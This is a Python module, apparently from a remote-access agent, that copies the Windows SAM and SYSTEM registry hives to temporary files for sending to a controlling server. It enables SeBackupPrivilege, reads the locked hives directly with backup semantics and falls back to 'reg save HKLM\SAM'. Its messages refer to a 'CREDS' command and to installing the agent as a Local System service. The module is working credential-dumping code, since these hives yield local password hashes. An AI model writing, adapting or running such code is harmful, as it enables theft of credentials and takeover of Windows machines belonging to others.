"""
Retrieval of SAM and SYSTEM hives: copies entire .hive files
for sending to the server (same logic as screenshot: base64 + SUCCESS|...).
"""
import os
import subprocess
import sys
import tempfile

SAM_PATH = "C:\\Windows\\System32\\config\\SAM"
SYSTEM_PATH = "C:\\Windows\\System32\\config\\SYSTEM"
REG_SYSTEM_KEY = "HKLM\\SYSTEM"
REG_SAM_KEY = "HKLM\\SAM"

SE_BACKUP_NAME = "SeBackupPrivilege"
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x0002
FILE_FLAG_BACKUP_SEMANTICS = 0x02000000


def _short_temp_hive_path(label: str) -> str:
    if sys.platform == "win32":
        base = os.environ.get("SystemRoot", "C:\\Windows") + "\\Temp"
        try:
            os.makedirs(base, exist_ok=True)
        except OSError:
            base = tempfile.gettempdir()
        return os.path.join(base, "c%ds%s.hiv" % (os.getpid(), label[:3]))
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".hive")
    tmp.close()
    return tmp.name


def _enable_backup_privilege():
    if sys.platform != "win32":
        return True
    try:
        import win32security
        import win32api
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY,
        )
        try:
            priv = [(
                win32security.LookupPrivilegeValue(None, win32security.SE_BACKUP_NAME),
                win32security.SE_PRIVILEGE_ENABLED,
            )]
            win32security.AdjustTokenPrivileges(hToken, 0, priv)
            return win32api.GetLastError() == 0
        finally:
            win32api.CloseHandle(hToken)
    except Exception:
        try:
            import ctypes
            from ctypes import wintypes
            advapi32 = ctypes.windll.advapi32
            kernel32 = ctypes.windll.kernel32
            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES)]
            hToken = wintypes.HANDLE()
            if not advapi32.OpenProcessToken(
                kernel32.GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(hToken),
            ):
                return False
            try:
                luid = LUID()
                if not advapi32.LookupPrivilegeValueW(None, SE_BACKUP_NAME, ctypes.byref(luid)):
                    return False
                tp = TOKEN_PRIVILEGES()
                tp.PrivilegeCount = 1
                tp.Privileges.Luid = luid
                tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED
                ok = advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
                return bool(ok) and kernel32.GetLastError() == 0
            finally:
                kernel32.CloseHandle(hToken)
        except Exception:
            return False


def _copy_locked_hive_to_temp(src_path: str) -> str:
    if sys.platform != "win32":
        with open(src_path, "rb") as f:
            data = f.read()
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".hive")
        tmp.close()
        with open(tmp.name, "wb") as f:
            f.write(data)
        return tmp.name

    import ctypes
    from ctypes import wintypes
    kernel32 = ctypes.windll.kernel32
    kernel32.CreateFileW.restype = wintypes.HANDLE
    hFile = kernel32.CreateFileW(
        src_path,
        0x80000000,
        0,
        None,
        3,
        FILE_FLAG_BACKUP_SEMANTICS,
        None,
    )
    if hFile == wintypes.HANDLE(-1).value:
        raise OSError(kernel32.GetLastError(), "CreateFileW failed: %s" % src_path)
    out_path = _short_temp_hive_path("sys" if src_path == SYSTEM_PATH else "sam")
    try:
        buf = ctypes.create_string_buffer(1024 * 1024)
        nread = wintypes.DWORD()
        with open(out_path, "wb") as f:
            while kernel32.ReadFile(hFile, buf, len(buf), ctypes.byref(nread), None) and nread.value:
                f.write(buf.raw[: nread.value])
        return out_path
    finally:
        kernel32.CloseHandle(hFile)


def _copy_hive_via_reg_save(reg_key: str) -> str:
    label = "sys" if reg_key == REG_SYSTEM_KEY else "sam"
    out_path = _short_temp_hive_path(label)
    r = subprocess.run(
        ["reg", "save", reg_key, out_path, "/y"],
        capture_output=True,
        text=True,
        timeout=60,
    )
    if r.returncode != 0:
        if os.path.exists(out_path):
            try:
                os.unlink(out_path)
            except Exception:
                pass
        raise OSError(0, "reg save %s failed: %s" % (reg_key, (r.stderr or r.stdout or "").strip()))
    return out_path


def get_sam_system_hives():
    """
    Retrieves entire SYSTEM and SAM files (.hive) to send to the server.
    Same logic as take_screenshot: returns (success, files_or_error).
    files = [(path_system, "SYSTEM"), (path_sam, "SAM")] with implicit .hive extension.
    """
    temp_system = temp_sam = None
    try:
        if sys.platform != "win32":
            return False, "CREDS (hives) is only supported on Windows."

        if not _enable_backup_privilege():
            return False, (
                "SeBackupPrivilege required. "
                "Run as Administrator or install the agent as a service (Local System)."
            )

        def get_system():
            try:
                return _copy_locked_hive_to_temp(SYSTEM_PATH)
            except OSError as e:
                if e.errno == 32:
                    return _copy_hive_via_reg_save(REG_SYSTEM_KEY)
                raise

        def get_sam():
            try:
                return _copy_locked_hive_to_temp(SAM_PATH)
            except OSError as e:
                if e.errno == 32:
                    return _copy_hive_via_reg_save(REG_SAM_KEY)
                raise

        temp_system = get_system()
        temp_sam = get_sam()
        return True, [
            (os.path.abspath(temp_system), "SYSTEM"),
            (os.path.abspath(temp_sam), "SAM"),
        ]
    except Exception as e:
        return False, str(e)
